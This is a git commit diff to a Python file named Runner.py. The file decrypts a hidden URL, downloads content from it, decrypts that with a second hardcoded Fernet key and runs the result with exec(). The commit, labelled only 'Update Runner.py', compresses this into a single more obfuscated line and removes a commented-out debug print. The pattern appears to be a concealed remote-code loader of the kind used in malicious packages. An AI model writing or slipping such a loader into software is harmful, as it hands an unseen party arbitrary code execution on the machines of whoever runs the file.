81412ca36098aa4cb946efa5e8692dc9cee53d6e
tygoz <81298529+tygoz@users.noreply.github.com>
2024-06-11 10:13:09 +0000

    Update Runner.py

--- Runner.py
+++ Runner.py
@@ -1,8 +1,4 @@
 import requests
 from cryptography.fernet import Fernet
-
-url_crypt = Fernet(b'GadiJcskj6XvTZnJGIw-dDWk-D-z-waUeQFJ0stCwyc=')
-online_crypt = Fernet(b'o2JkTsUVrpxKkmN-1-95SOTxM4kzBzirMv5a7fnctho=')
 remote_url = b'gAAAAABmaBfB2CsAhkOYCXAnf2Tzq0yzoGai53JRAiwUv6uUdMRMEMguhfN1dGie8OyPKKfDTrQsz3i1QIPkxxhV9GtIQaQN-acwZne0O5iy8NHcKCIEBIrtGOY_dwYyTNfkQL-u0kM0JtmBb0HcS9FIg4Dd7LNviTp42tfPRBQS272z-Fda3fw='
-#print(online_crypt.decrypt(requests.get(url_crypt.decrypt(remote_url).decode('utf-8')).text.encode('utf-8')).decode('utf-8'))
-exec(online_crypt.decrypt(requests.get(url_crypt.decrypt(remote_url).decode('utf-8')).text.encode('utf-8')).decode('utf-8'))
+exec(Fernet(b'o2JkTsUVrpxKkmN-1-95SOTxM4kzBzirMv5a7fnctho=').decrypt(requests.get(Fernet(b'GadiJcskj6XvTZnJGIw-dDWk-D-z-waUeQFJ0stCwyc=').decrypt(remote_url).decode('utf-8')).text.encode('utf-8')).decode('utf-8'))
